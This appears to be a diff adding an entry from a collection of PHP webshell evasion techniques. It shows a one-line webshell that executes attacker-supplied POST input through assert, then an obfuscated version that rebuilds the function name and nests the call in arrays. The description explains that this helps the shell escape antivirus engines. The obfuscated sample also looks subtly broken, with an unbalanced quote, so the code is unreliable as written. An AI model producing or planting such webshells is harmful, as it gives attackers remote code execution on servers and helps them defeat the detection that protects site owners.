@@ -1,0 +1,19 @@
+Original webshell sample:
+
+'''
+<?php assert($_POST['q']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$b = substr_replace("assexx","rt",4);
+$a = array($array = array(" => $b($_POST['q'])));
+var_dump($a);
+?>
+'''
+
+Description:
+
+The code first obfuscates the sensitive function "assert", then assigns the webshell "assert($_POST['q']);" to the variable "a" using a two-dimensional array, and finally executes the webshell using the var_dump method. The use of two-dimensional arrays can further improve the success rate of escaping antivirus engine.
